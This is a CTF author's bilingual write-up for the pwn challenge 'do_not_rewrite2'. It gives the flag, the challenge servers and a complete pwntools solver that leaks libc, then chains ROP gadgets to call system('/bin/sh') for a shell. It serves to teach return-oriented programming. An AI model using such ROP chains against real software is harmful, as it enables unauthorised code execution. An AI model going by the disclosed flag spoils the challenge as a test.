---
title: do_not_rewrite2
level: 3
flag: FLAG{r0p_br0d3n_0ur_w0r1d}
writer: manu1
---

# do_not_rewrite2

## 問題文

便利な関数が消えてしまいましたね...
ropをしてみましょう

show_flag() has disappeared :<
Let's try ROP

`nc chal-lz56g6.wanictf.org 9005`

---

NOTE: In case the server is down, try the following backup server. 上記のサーバーが正しく動作していない場合は、次のバックアップサーバーを使用してください。

`chal-ywu5dn.wanictf.org`

---

## 解法

do_not_rewriteの続きです。show_flag()がなくなってしまったのでrop(return oriented programming)によってシェルを獲得することを狙います。アラインメント等に気をつけて`system(/bin/sh)`等を呼ぶrop chainを組めばシェルを獲得することができます。


Continuing from do_not_rewrite. Since show_flag() has been removed, we aim to obtain a shell through ROP (return-oriented programming). By carefully aligning and constructing a ROP chain that calls system(/bin/sh) or similar, you can obtain a shell.


solver例は以下のとおりです。

The solver is as follows.
```
from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
rop = ROP(libc)

io = process(elf.path)

input("let's go")

# get address of show_flag()
io.recvuntil(b"= ")
addr_printf = io.recvline()[:-1].decode('utf-8')
libc.address = int(addr_printf, 16) - 0x600f0
info(f"libc_base:{hex(libc.address)}")

#exploit
io.recvline()
for i in range(3):
    io.sendlineafter(b": ", b"a")
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b": ", b"1")


pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc.address
ret = rop.find_gadget(['ret'])[0] + libc.address

chain = p64(pop_rdi)
chain += p64(next(libc.search(b'/bin/sh')))
chain += p64(ret)
chain += p64(libc.sym["system"])

io.sendlineafter(b": ", chain)
io.sendlineafter(b": ", b"+")
io.sendlineafter(b": ", b"+")

io.recv()
io.interactive()

```

どうでもいい余談: 実はgachi-ropさせるのがdo_not_rewrite3(hard)だったんですが、Wani CTFの1週間前に開催されたCTFで丸かぶりの問題が出題され、無事ボツとなりました...

どうでもいい余談②: 開始25分前まで問題の調整をしてインフラ係を困らせた戦犯は僕です。その危機を救った神はLaikaさんです。


Trivial: Actually, making you perform gachi-rop was the goal of do_not_rewrite3 (hard), but a week before Wani CTF, a problem with the exact same concept appeared in another CTF, so it was scrapped...

 Trivial②: I was the culprit who troubled the infrastructure team by making adjustments to the problem until 25 minutes before the start. The savior who rescued us from that crisis was Laika.